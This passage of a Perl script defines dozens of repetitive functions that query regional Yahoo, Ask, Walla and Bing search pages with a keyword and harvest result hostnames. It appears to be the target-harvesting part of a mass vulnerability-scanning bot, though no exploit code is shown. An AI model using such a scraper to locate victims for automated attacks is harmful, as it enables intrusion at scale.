        my $search = ("http://search.walla.co.il/?q=".uri_escape($key)."&type=text&page=".$b);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"http:\/\/(.+?)\" title=/g) {
            my $link = $1;
            if ($link !~ /walla\.co\.il/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sub yahooCA() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://CA.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=ca&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooCA/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yahooUK() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://UK.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=gb&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooUK/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(4);
sub yahooDE() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://DE.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=de&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooDE/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yahooFR() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://FR.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=fr&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooFR/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yahooES() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://ES.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=es&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooES/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(4);
sub yahooIT() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://IT.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=it&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooIT/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yahooHK() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://HK.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=hk&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooHK/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yahooID() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://ID.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=id&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooID/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(4);
sub yahooIN() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://IN.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=in&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooIN/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yahooAU() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://AU.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=au&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooAU/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yahooMX() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://MX.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=mx&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooMX/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(4);
sub yahooTW() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://TW.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=tw&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooTW/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yahooBR() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://BR.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=br&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooBR/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yahooAR() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://AR.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=ar&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooAR/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(4);
sub yahooNL() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://NL.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=nl&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooNL/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yahooDK() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://DK.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=dk&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooDK/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yahooPH() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://PH.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=ph&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooPH/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(4);
sub yahooCL() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://CL.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=cl&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooCL/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yahooRU() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://RU.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=ru&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooRU/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yahooCH() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://CH.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=ch&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooCH/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(4);
sub yahooCO() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://CO.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=co&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooCO/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yahooFI() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://FI.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=fi&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooFI/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yahooRO() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://RO.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=ro&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooRO/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(4);
sub yahooVE() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://VE.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=ve&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooVE/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yahooAT() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://AT.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=at&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooAT/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yahooPL() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://PL.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=pl&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooPL/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(4);
sub yahooKR() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://KR.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=kr&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooKR/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yahooNZ() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://NZ.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=nz&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooNZ/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yahooGR() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://GR.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=gr&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooGR/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(4);
sub yahooPE() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://PE.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".uri_escape($key)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=pe&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooPE/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sub askCA() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=100; $i+=1) {
        my $search = ("http://ca.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
            my $link = $1;
            if ($link !~ /askCA\.com/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(4);
sub askDE() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=100; $i+=1) {
        my $search = ("http://de.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
            my $link = $1;
            if ($link !~ /askDE\.com/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub askIT() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=100; $i+=1) {
        my $search = ("http://it.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
            my $link = $1;
            if ($link !~ /askIT\.com/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub askUK() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=100; $i+=1) {
        my $search = ("http://uk.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
            my $link = $1;
            if ($link !~ /askUK\.com/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub askFR() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=100; $i+=1) {
        my $search = ("http://fr.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
            my $link = $1;
            if ($link !~ /askFR\.com/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub askES() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=100; $i+=1) {
        my $search = ("http://es.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
            my $link = $1;
            if ($link !~ /askES\.com/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub askRU() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=100; $i+=1) {
        my $search = ("http://ru.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
            my $link = $1;
            if ($link !~ /askRU\.com/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(4);
sub askNL() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=100; $i+=1) {
        my $search = ("http://nl.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
            my $link = $1;
            if ($link !~ /askNL\.com/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub askPL() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=100; $i+=1) {
        my $search = ("http://pl.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
            my $link = $1;
            if ($link !~ /askPL\.com/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub askAT() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=100; $i+=1) {
        my $search = ("http://at.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
            my $link = $1;
            if ($link !~ /askAT\.com/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub askSE() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=100; $i+=1) {
        my $search = ("http://se.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
            my $link = $1;
            if ($link !~ /askSE\.com/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub askDK() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=100; $i+=1) {
        my $search = ("http://dk.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
            my $link = $1;
            if ($link !~ /askDK\.com/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub askNO() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=100; $i+=1) {
        my $search = ("http://no.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
            my $link = $1;
            if ($link !~ /askNO\.com/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(4);
sub askAU() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=100; $i+=1) {
        my $search = ("http://au.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
            my $link = $1;
            if ($link !~ /askAU\.com/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub askBR() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=100; $i+=1) {
        my $search = ("http://br.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
            my $link = $1;
            if ($link !~ /askBR\.com/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub askMX() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=100; $i+=1) {
        my $search = ("http://mx.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
            my $link = $1;
            if ($link !~ /askMX\.com/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(4);
sub askJP() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=100; $i+=1) {
        my $search = ("http://jp.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
            my $link = $1;
            if ($link !~ /askJP\.com/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sub bingDE() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=de&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingDE/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(4);
sub bingUK() {
    my @list;
    my $key = $_[0];
